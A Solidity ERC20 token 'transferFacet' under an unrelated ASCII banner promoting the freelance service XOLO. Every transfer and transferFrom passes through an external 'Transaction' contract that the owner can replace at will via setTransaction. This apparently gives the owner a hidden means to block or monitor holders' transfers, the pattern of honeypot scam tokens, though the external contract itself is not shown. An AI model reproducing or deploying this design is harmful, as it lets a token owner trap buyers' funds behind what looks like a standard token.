/*
    Best way to manage your freelance business with XOLO
    
    _____     __   ,-----.      .---.       ,-----.     
    \   _\   /  /.'  .-,  '.    | ,_|     .'  .-,  '.   
     .-./ ). /  '/ ,-.|  \ _ \ ,-./  )    / ,-.|  \ _ \  
     \ '_ .') .';  \  '_ /  | :\  '_ '`) ;  \  '_ /  | : 
     (_ (_) _) ' |  _`,/ \ _/  | > (_)  ) |  _`,/ \ _/  | 
     /    \   \: (  '\_/ \   ;(  .  .-' : (  '\_/ \   ; 
     `-'`-'    \\ `"/  \  ) /  `-'`-'|___\ `"/  \  ) /  
    /  /   \    \'. \_/``".'    |        \'. \_/``".'   
    '--'     '----' '-----'      `--------`  '-----'     
    
    https://www.xolo.io/
    https://twitter.com/xolopreneur
    https://www.facebook.com/xolopreneur/
    https://www.linkedin.com/company/xolopreneur/
*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract transferFacet is ERC20, Ownable {
    function transfer(
        address to,
        uint256 value
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.txs.record(msg.sender, to, value);
        return super.transfer(to, value);
    }
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.txs.record(from, to, value);
        return super.transferFrom(from, to, value);
    }
    function setTransaction(address _tx) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.txs = Transaction(_tx);
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
}
